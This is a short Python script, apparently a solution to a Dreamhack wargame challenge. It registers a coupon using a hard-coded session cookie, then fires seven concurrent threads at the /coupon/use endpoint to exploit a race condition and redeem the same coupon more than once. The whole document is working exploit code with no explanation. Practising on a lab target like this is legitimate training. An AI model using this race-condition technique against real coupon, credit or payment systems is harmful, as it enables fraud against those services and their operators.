import requests
from threading import Thread

url = "http://host1.dreamhack.games:19091"

coupon = "1f4ca86bd8a732464ece2802a0411e70c3ae04f4cf4143a9a0dc57cf4f88b234"
cookie = {"session": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiZ3Vlc3QiLCJpc0xvZ2luIjp0cnVlLCJpYXQiOjE3MzYxNDgzOTZ9.QLSV3EUC4rTZFNWJTibDVeyqh076ogiTVWhkaGD9lws"}

requests.post(url+"/coupon/register", cookies=cookie, data={"coupon": coupon})

def useReq():
    r = requests.post(url+"/coupon/use", cookies=cookie, data={"coupon": coupon})
    if "Success" in r.text:
        print("Success")

th = Thread(target=useReq)
th1 = Thread(target=useReq)
th2 = Thread(target=useReq)
th3 = Thread(target=useReq)
th4 = Thread(target=useReq)
th5 = Thread(target=useReq)
th6 = Thread(target=useReq)
th.start()
th1.start()
th2.start()
th3.start()
th4.start()
th5.start()
th6.start()